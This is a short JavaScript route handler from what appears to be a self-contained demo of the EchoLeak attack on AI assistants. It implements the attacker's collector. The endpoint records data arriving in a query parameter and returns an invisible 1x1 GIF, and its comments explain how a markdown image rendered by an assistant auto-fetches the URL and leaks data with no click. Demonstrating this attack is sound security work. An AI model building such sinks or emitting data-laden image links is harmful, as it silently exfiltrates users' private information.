// THE ATTACKER'S COLLECTOR. In a real attack this lives on the attacker's server;
// here it's the same app so the demo is self-contained. It records whatever arrives
// in the query string (the exfiltrated data) and returns a 1x1 transparent GIF, so
// the victim's browser "loads the image" and nothing looks broken.
//
// This is the EchoLeak exfiltration sink: a URL that leaks data simply by being
// auto-fetched when the markdown image renders. No click. No consent.
//
// Captures are stored via lib/store.js — Redis when configured (so the panel works
// across Vercel's serverless instances), in-memory locally. The LEAK works anywhere;
// only the on-page display needs shared state.
import { pushCapture } from "../../../lib/store.js";

// 1x1 transparent GIF
const PIXEL = Buffer.from(
  "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
  "base64"
);

export async function GET(req) {
  const data = new URL(req.url).searchParams.get("d");
  if (data) {
    await pushCapture(data);
    console.log("🚨 EXFILTRATION CAPTURED:", data.slice(0, 300));
  }
  return new Response(PIXEL, {
    headers: { "Content-Type": "image/gif", "Cache-Control": "no-store" },
  });
}
